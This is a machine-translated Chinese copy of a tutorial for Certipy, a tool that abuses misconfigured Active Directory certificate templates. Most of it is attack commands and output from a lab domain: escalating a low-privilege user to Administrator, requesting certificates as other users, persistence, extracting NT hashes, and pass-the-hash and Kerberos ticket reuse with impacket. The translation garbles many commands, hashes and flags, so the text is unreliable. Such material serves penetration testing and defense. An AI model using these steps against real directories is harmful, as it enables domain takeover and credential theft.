# Certipy:针对 Active Directory 证书滥用的 Python 实现

> 原文：<https://kalilinuxtutorials.com/certipy/>

[![](img/c6986e67c942adfac42242cb00456ffb.png)](https://blogger.googleusercontent.com/img/a/AVvXsEg3sUJOtECI-8uHdvFxy8_2Su7ZusmuSNXs7txzYdzE0ixl3sEPfGaZBOzuE7IqilBuUIhA5fbO_II1c_QCD9lk7ymmVqdZn4GmvegOnvmtwFFvM0U_xFB8M0xfp-rk-y9DwQSNcGd7658SSS-T2WiSggfpCRJChlXwkaMeJaUWhvMXwfseA6IZ6nmN=s728)

Certipy 是一个 Python 工具，用于列举和滥用活动目录证书服务(AD CS)中的错误配置。

基于 C#变体 Certify from @harmj0y 和@tifkin_。

**安装**

**$ python3 setup.py 安装**

**用途**

**$ certipy -h
用法:certi py[-h][-DEBUG][-target-IP IP address][-name server name server][-DNS-TCP][-hashes lm hash:n hash][-no-pass][-k][-DC-IP address]
目标{find，req，auth，auto }……
Active Directory 证书滥用
位置参数:
目标[[domain/]用户名[:密码]@]
{find，req，req 根据目标参数从 ccache 文件(KRB5CCNAME)中获取凭据。如果找不到有效的凭证
，它将使用命令行中指定的凭证
-dc-ip ip 地址域控制器的 ip 地址。如果省略，它将使用目标参数
中指定的域部分(FQDN)连接:
-目标 ip ip 地址
目标机器的 ip 地址。如果省略，它将使用指定为目标的任何内容。这在目标是
NetBIOS 名称并且您无法解析它时很有用
-名称服务器名称服务器
名称服务器用于 dns 解析
-dns-tcp 使用 tcp 而不是 UDP 进行 DNS 查询
认证:
-哈希 lm hash:n hash
NTLM 哈希，格式为 lm hash:n hash**

**例题**

**自动**

自动滥用证书模板进行特权提升。此操作将尝试查找、请求并验证为`**Administrator**`用户。成功后，将保存一个凭据缓存，并将从 TGS_REP 中的 PAC 中解密 NT 哈希

为了演示错误配置证书模板是多么容易，默认的证书模板`**Web Server**`被复制到了`**Copy of Web Server**`。唯一的变化是 EKU `**Server Authentication**`被移除，认证用户可以注册。这将允许注册者指定主题并将其用于客户端身份验证，即作为任何用户进行身份验证。如果没有指定 eku，则证书可以用于所有目的。或者，人们可以添加`**Client Authentication**` EKU。

在本例中，用户`**john**`是一个低特权用户，他被允许注册`**Copy of Web Server**`模板。

**$ certi py ' predator/John:Passw0rd @ DC . predator . local ' auto
[*]用 CA 'predator-DC-CA' [* ]生成 RSA 密钥
[ *]请求证书[* ]请求成功
[ *]用 UPN '管理员'[【T9]]获得证书保存证书到' 1.crt'
[ *]保存私钥到' 1 . key '[【T11 将凭据缓存保存到“Administrator . ccache”
[*]尝试检索“Administrator@predator”的 NT 哈希[*]获得了“Administrator@predator”的 NT 哈希:fc 525 c 9683 e 8 Fe 067095 ba 2d DC 971889****

默认情况下，选择用户`**Administrator**`。使用`-**user**`参数为另一个用户创建证书。

**找到**

`find`动作将查找由一个或多个 ca 启用的证书模板。

**找到易受攻击的模板**

使用 **`-vulnerable`** 参数仅查找易受攻击的证书模板。

**$ certi py ' predator/john:pass w0 rd @ DC . predator . local ' find-vulnerable
[*]查找' John '的易受攻击证书模板
用户
姓名:predator\john
组:
证书颁发机构
0
CA 名称:predator-DC-CA
DNS 名称:dc.predator.local
证书主题:CN=predator-DC-CA，DC=predator、 DC =本地
证书序列号:1976d 0 fefcafc 9 a 84d 02d 305 fa 88d 84d
证书有效期开始:2021-10-06 11:32:01+00:00
证书有效期结束:2026-10-06 11:42:01+00:00
用户指定 SAN:禁用
CA 权限
所有者:BUILTIN\Administrator
有效期:2 年
续期:6 周
证书名称标志:enroluesupplies subject
注册标志:无
需要授权签名:0
扩展密钥用法:
权限
注册权限
注册权限:掠夺者\域管理员
掠夺者\企业管理员
认证用户
对象控制权限
所有者:掠夺者\管理员
写所有者委托人:掠夺者\域管理员
掠夺者\企业管理员【T43 predator\Administrator
写属性 principles:predator \ Domain Admins
predator \ Enterprise Admins
predator \ Administrator
易受攻击原因:“认证用户”可以注册，注册者提供主题和模板允许认证
“认证用户”可以注册，模板有危险 EKU**

使用`**-user**`参数为另一个用户查找易受攻击的证书模板。默认情况下，将使用当前用户。

**找到所有模板**

**$ certi py ' predator/john:pass w0 rd @ DC . predator . local ' find
[*]查找' John '的证书模板
用户
名称:predator\john
组:
证书颁发机构
0
CA 名称:predator-DC-CA
DNS 名称:dc.predator.local
证书主题:CN=predator-DC-CA，DC=predator、 DC =本地
证书序列号:1976d 0 fefcafc 9 a 84d 02d 305 fa 88d 84d
证书有效期开始:2021-10-06 11:32:01+00:00
证书有效期结束:2026-10-06 11:42:01+00:00
用户指定 SAN:禁用
CA 权限
所有者:BUILTIN\Administrator
年份
续订期:6 周
证书名称标志:subjectrequiredirepath
subjectrequirememail
SubjectAltRequireEmail
SubjectAltRequireUpn
注册标志:自动注册
publishettos
包含对称算法
所需授权签名:0
扩展密钥用法:加密文件系统
安全电子邮件
客户端身份验证
权限
注册权限
注册权限:predator\Domain Admins
predator \ Enterprise Admins
写 Dacl 主体:predator \ Domain Admins
predator \ Enterprise Admins
写属性主体:predator \ Domain Admins
predator \ Enterprise Admins
[…]
11
CAs:predator-DC-CA
模板名称:Web 服务器副本
有效期:2 年
续订期:6 周
证书名称标志:enroluesupplies subject
注册标志:无
需要授权签名:0
扩展密钥用法:
权限
注册权限
注册权限:predator \域管理员
predator \企业管理员【T68 掠夺者\企业管理员
掠夺者\管理员
写 Dacl 主体:掠夺者\域管理员
掠夺者\企业管理员
掠夺者\管理员
写属性主体:掠夺者\域管理员
掠夺者\企业管理员
掠夺者\管理员**

**请求**

从证书模板申请新证书。默认情况下，将使用在`**target**`参数中指定的当前用户。

**作为另一用户请求**

要以另一个用户的身份申请证书，请使用`**-alt**`参数。这仅适用于注册者指定主题的证书模板，或者当 CA 允许注册者指定 UPN 时，即`**User Specified SAN**`设置为`**Enabled**`。

在这个例子中，用户`**john**`是低特权用户。证书模板`**Copy of Web Server**`是默认`**Web** **Server**`模板的副本。EKU `**Server Authentication**`被移除，因此模板没有 EKU(没有 EKUs =任何用途)。默认的`*Web Server*`模板允许注册者提供主题。

`**john**`将作为`**jane**`请求认证有效的证书。CA `**predator-DC-CA**`已经`**Copy of Web Server**`启用。

**$ certi py ' predator/John:Passw0rd @ DC . predator . local ' req-template ' Web 服务器副本'-CA ' predator-DC-CA '-alt ' Jane '
[*]生成 RSA 密钥[* ]请求证书
[ *]请求成功[* ]用 UPN 'jane'
[ *]获得证书保存证书到' 2.crt' [* ]保存私钥到' 2.key'**

证书和密钥将被 DER 编码并保存到`**<request ID>.(crt|key)**`，其中`**request ID**`由服务器返回。

**要求成为自我**

也可以为当前用户申请证书。对于持久性来说，这是一个很好的选择，因为证书不受密码更改的影响。默认情况下，允许域用户注册默认的`**Use**r`模板。

**$ certi py ' predator/John:Passw0rd @ DC . predator . local ' req-template ' User '-CA ' predator-DC-CA '
[*]生成 RSA 密钥[* ]请求证书
[ *]请求成功[* ]用 UPN ' John @ predator . local '
[*]获得证书保存证书到' 3.crt' [* ]保存私钥到' 3.key'**

**认证**

`auth`动作将使用 PKINIT Kerberos 扩展来验证所提供的证书。必须在`**target**`参数中指定目标用户。如果未指定，Certipy 将尝试从证书中提取 UPN。TGT 将被保存在`**<username>.ccach**e`的凭证缓存中。

将通过使用 Kerberos U2U 为当前用户请求一个 TGS 来提取 nt 哈希，其中加密的 PAC 将包含可以解密的 NT 哈希。

$ certi py ' predator/Jane @ DC . predator . local ' auth-cert。/2.crt -key。/2.key
[ *]使用 UPN: 'jane@predator' [* ]尝试获取 TGT…
[ *]将凭据缓存保存到' jane.ccache' [* ]尝试检索' jane@predator '的 NT 哈希
[*]获取' jane@predator '的 NT 哈希:077 cccc 23 F8 ab 7031726 a3 b 70 c 694 a 49

**使用 NT 哈希**

您可以简单地为许多服务传递散列(PTH)。例如中小型企业:

**$ in packet-SMB client-hashes:fc 525 c 9683 e 8 Fe 067095 ba 2d DC 971889 ' predator . local/administrator @ DC . predator . local '
in packet v 0 . 9 . 23–Copyright 2021 secure auth Corporation
键入命令列表帮助
who
host: \172.16.19.1，user: administrator，active: 1，idle: 0**

**使用凭证缓存**

凭据缓存当前保存一个 TGT。TGT 可用于向 TGS 请求服务。例如，在`**dc.predator.local**`为`**cifs**` (SMB)服务请求 TGS:

**$ #使用 Certipy 中的 TGT
$ export krb 5c name =。/administrator . ccache
$ # request TGS
$ impacket-getST-SPN ' CIFS/DC . predator . local '-DC-IP 172 . 16 . 19 . 100-no-pass-k ' predator/administrator '
$ #使用来自 impacket-getST
$ export krb 5c name =。/administrator.ccache
$ #使用 TGS 运行 smbclient(注意 FQDN)
$ Impacket-SMB client-k-no-pass ' predator . local/Administrator @ DC . predator . local '
Impacket v 0 . 9 . 23–Copyright 2021 secure auth Corporation
键入命令列表的帮助
#who
主机:\172.16.19.1，用户:管理员，活动:1，空闲:0 【T12**

**注意**`impacket-getST`将在`<username>.ccache`覆盖凭证缓存。在使用`impacket-getST`请求 TGS 之前，从 Certipy 创建凭据缓存的副本。

[**Download**](https://github.com/ly4k/Certipy)